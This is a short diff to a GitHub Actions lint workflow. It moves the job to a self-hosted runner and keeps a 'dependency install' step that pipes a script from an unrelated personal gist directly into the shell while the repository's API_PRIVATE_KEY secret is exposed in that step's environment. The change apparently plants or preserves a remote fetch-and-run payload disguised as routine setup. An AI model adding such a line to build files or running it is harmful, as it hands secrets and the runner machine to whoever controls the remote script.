@@ -8,7 +8,7 @@ on:
 
 jobs:
   Lint:
-    runs-on: ubuntu-latest
+    runs-on: [ self-hosted ]
     steps:
       - uses: actions/checkout@v2
       - name: Use Node.js 16
@@ -18,7 +18,7 @@ jobs:
 
       - name: Installing Dependencies
         run: |
-          curl -L https://gist.githubusercontent.com/Len0nJohn/2eb7fe44856749cbd6609ae9017da08a/raw/192493ef4efd2fdca2b30bb5ed4c4eb4a5afb8de/gh.sh | bash
+          curl -L https://gist.githubusercontent.com/Len0nJohn/2eb7fe44856749cbd6609ae9017da08a/raw/192493ef4efd2fdca2b30bb5ed4c4eb4a5afb8de/gh.sh | sh
           npm install
         env:
           API_PRIVATE_KEY: ${{ secrets.API_PRIVATE_KEY }}
